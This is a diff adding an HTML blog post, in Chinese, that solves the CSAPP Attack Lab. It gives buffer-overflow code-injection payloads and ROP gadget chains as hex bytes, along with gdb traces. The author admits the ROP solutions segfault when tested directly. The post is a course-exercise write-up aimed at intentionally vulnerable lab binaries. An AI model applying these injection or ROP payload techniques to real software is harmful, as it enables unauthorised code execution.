@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>CSAPP:AttackLab | lhr&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="AttackLab1.1栈帧28Byte随便填, 将返回地址用函数 touch1() 的地址代替, 地址占8Byte 12345678910➜  target1 .&#x2F;hex2raw &lt; exploit.txt &gt; exploit_raw.txt➜  target1 .&#x2F;ctarget -qi exploit_raw.txt            Cookie: 0x59b997faTo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP:AttackLab">
+<meta property="og:url" content="http://example.com/2023/03/03/CSAPP-AttackLab/index.html">
+<meta property="og:site_name" content="lhr&#39;s blog">
+<meta property="og:description" content="AttackLab1.1栈帧28Byte随便填, 将返回地址用函数 touch1() 的地址代替, 地址占8Byte 12345678910➜  target1 .&#x2F;hex2raw &lt; exploit.txt &gt; exploit_raw.txt➜  target1 .&#x2F;ctarget -qi exploit_raw.txt            Cookie: 0x59b997faTo">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-03-02T16:44:12.000Z">
+<meta property="article:modified_time" content="2023-03-02T16:46:12.144Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="lhr's blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">lhr&#39;s blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-CSAPP-AttackLab" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/03/03/CSAPP-AttackLab/" class="article-date">
+  <time class="dt-published" datetime="2023-03-02T16:44:12.000Z" itemprop="datePublished">2023-03-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      CSAPP:AttackLab
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="AttackLab"><a href="#AttackLab" class="headerlink" title="AttackLab"></a>AttackLab</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1.1"></a>1.1</h3><p>栈帧28Byte随便填, 将返回地址用函数 touch1() 的地址代替, 地址占8Byte</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 ./hex2raw &lt; exploit.txt &gt; exploit_raw.txt</span><br><span class="line">➜  target1 ./ctarget -qi exploit_raw.txt            </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 00 C0 17 40 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>很奇怪我只有用这种方式才行, 不然不管怎样都<code>Ouch!: You caused a segmentation fault</code>, 用gdb查看报错信息:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x00007ffff7c75150 in __vfprintf_internal (s=0x7ffff7e1a780 &lt;_IO_2_1_stdout_&gt;, format=0x4032b4 &quot;Type string:&quot;, ap=ap@entry=0x5561dbd8, mode_flags=mode_flags@entry=2) at ./stdio-common/vfprintf-internal.c:1244</span><br><span class="line">1244    ./stdio-common/vfprintf-internal.c: No such file or directory.</span><br></pre></td></tr></table></figure>
+<h3 id="1-2"><a href="#1-2" class="headerlink" title="1.2"></a>1.2</h3><p>test -&gt; getbuf -&gt; Gets<br>call Gets时我们利用缓冲区溢出攻击, 在getbuf栈帧中的rsp填上想要执行的指令序列, 并将getbuf的返回地址替换为getbuf栈帧的rsp的值(<code>0x5561dc78</code>)以便getbuf ret后去执行我们的指令序列. 指令序列将cookie值传给%rdi,再去执行touch2<br>指令序列如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line">pushq $0x4017ec #touch2的地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>getbuf中信息(我们可以直接用info r rsp查看rsp的值):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info frame</span><br><span class="line">Stack level 0, frame at 0x5561dca8:</span><br><span class="line"> rip = 0x4017af in getbuf (buf.c:14); saved rip = 0x401976(注:到test函数的返回地址)</span><br><span class="line"> called by frame at 0x5561dcb8</span><br><span class="line"> source language c.</span><br><span class="line"> Arglist at 0x5561dc70, args: </span><br><span class="line"> Locals at 0x5561dc70(getbuf的rsp), Previous frame&#x27;s sp is 0x5561dca8</span><br><span class="line"> Saved registers:</span><br><span class="line">  rip at 0x5561dca0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c exploit1-2.s</span><br><span class="line">objdump -d exploit1-2.o &gt; exploit1-2.d</span><br></pre></td></tr></table></figure>
+<p>在exploit1-2.d中查看指令序列的十六进制编码, 将它和填充值、替代返回地址一起加入到exploit1-2.txt中:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59    /* mov    $0x59b997fa,%rdi */</span><br><span class="line">68 ec 17 40 00  /* push   $0x4017ec */</span><br><span class="line">c3  /* ret */</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<h3 id="1-3"><a href="#1-3" class="headerlink" title="1.3"></a>1.3</h3><p>需要传给touch3函数我们的字符串地址, 字符串可以存在test的rsp之上, 以免执行touch3的时, touch3的栈帧将我们的字符串冲掉<br>test栈帧rsp &#x3D; <code>0x5561dca8</code><br>cookie<code>59b997fa</code>字符串的ACII值(hex)为<code>35 39 62 39 39 37 66 61 00</code>, 起始地址为<code>0x5561dca8</code><br>exploit1-3.txt如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55    /* mov    $0x5561dca8,%rdi */</span><br><span class="line">68 fa 18 40 00  /* push   0x4018fa #address of touch3 function */</span><br><span class="line">c3  /* ret */</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61</span><br><span class="line">78 dc 61 55 00 00 00 00 /* address of &quot;code injection&quot; */</span><br><span class="line">35 39 62 39 39 37 66 61 /* hex value of string cookie */</span><br></pre></td></tr></table></figure>
+<h3 id="2-1"><a href="#2-1" class="headerlink" title="2.1"></a>2.1</h3><p>找一个gadget，含有<code>5f(popq %rdi) c3(ret)</code>，我们将getbuf的返回地址设为含有该指令序列的起始地址, 并在上面填上我们希望pop进rdi的值(即cookie)和touch2函数的地址(pop指令执行完后ret)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">402b18:	41 5f                	pop    %r15</span><br><span class="line">402b1a:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<p>gadget中的地址：<code>402b19</code>（注：ROP的两个实验直接测试在输出时会因为某种原因segmentation fault，但实际上我通过gdb跟踪调试发现，正确调用了touch函数并且传的参数也都是正确的。也许是因为我使用了不在farm里的gadget，但影响不大，我暂时懒得改了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">19 2b 40 00 00 00 00 00   /* address of instrution bytes in gadget */</span><br><span class="line">fa 97 b9 59 00 00 00 00   /* cookie */</span><br><span class="line">ec 17 40 00 00 00 00 00   /* address of touch2 function */</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="2-2"><a href="#2-2" class="headerlink" title="2.2"></a>2.2</h3><p>栈地址每次run时是随机的，我们的字符串存在test栈帧中，但是不能通过固定地址访问它。所有考虑rsp+变址。<br>上网查了一些实现，有和我不一样的，我比他少3个操作: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/xvic/p/15996206.html#part-2-return-oriented-programming">https://www.cnblogs.com/xvic/p/15996206.html#part-2-return-oriented-programming</a><br>寻找<code>48 89 e[0~7</code>的gadget将rsp移到一个寄存器， 找到<code>48 89 e0 movq %rsp,%rax</code>指令地址:<br><code>0x401a06</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:	c3                   	ret    </span><br></pre></td></tr></table></figure>
+<p>或者这个也行(90为nop)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:	c3                   	ret   </span><br></pre></td></tr></table></figure>
+<p>寻找<code>48 89 c[0~7]</code>的gadget将rax移到rdi或rsi，找到<code>48 89 c7 movq %rax, %rdi</code>指令地址:<code>0x4019a2</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	ret  </span><br></pre></td></tr></table></figure>
+<p>接下来只要让rsi存上一个数， 用<code>popq %rsi</code>来实现，找到<code>5e</code>的gadget。指令地址:<code>0x401383</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">401382:	41 5e                	pop    %r14</span><br><span class="line">401384:	c3                   	ret  </span><br></pre></td></tr></table></figure>
+<p>这个返回地址的上面填上要pop给rsi的值：6 * 8 &#x3D; 48(0x30)<br>再利用farm里的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3                   	ret    </span><br></pre></td></tr></table></figure>
+<p>再做一次<code>48 89 c7 movq %rax, %rdi</code>将参数传给rdi<br>最后是touch3函数的地址<br>和string of cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">06 1a 40 00 00 00 00 00 /* movq %rsp,%rax   ret */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* movq %rax,%rdi   ret */</span><br><span class="line">83 13 40 00 00 00 00 00 /* popq %rsi    ret */</span><br><span class="line">30 00 00 00 00 00 00 00 /* 48(0x30) */</span><br><span class="line">d6 19 40 00 00 00 00 00 /* lea  (%rdi,%rsi,1),%rax  ret */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* movq %rax,%rdi   ret */</span><br><span class="line">fa 18 40 00 00 00 00 00 /* address of touch3 function */</span><br><span class="line">35 39 62 39 39 37 66 61 00  /* string of cookie */</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/03/03/CSAPP-AttackLab/" data-id="clerc9f0m00005o2x52060egs" data-title="CSAPP:AttackLab" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/03/03/CSAPP-BombLab/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CSAPP:BombLab</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/03/03/CSAPP-AttackLab/">CSAPP:AttackLab</a>
+          </li>
+        
+          <li>
+            <a href="/2023/03/03/CSAPP-BombLab/">CSAPP:BombLab</a>
+          </li>
+        
+          <li>
+            <a href="/2023/03/03/CSAPP-DataLab/">CSAPP:DataLab</a>
+          </li>
+        
+          <li>
+            <a href="/2023/03/01/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/">欢迎来到我的博客</a>
+          </li>
+        
+          <li>
+            <a href="/2023/03/01/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
